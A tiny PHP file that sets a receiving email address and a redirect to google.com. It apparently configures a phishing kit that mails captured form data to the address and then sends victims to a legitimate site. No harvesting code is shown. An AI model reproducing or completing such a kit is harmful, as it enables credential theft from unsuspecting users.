<?php 
$Receive_email="thetentonline@gmail.com";
$redirect="https://www.google.com/";
?>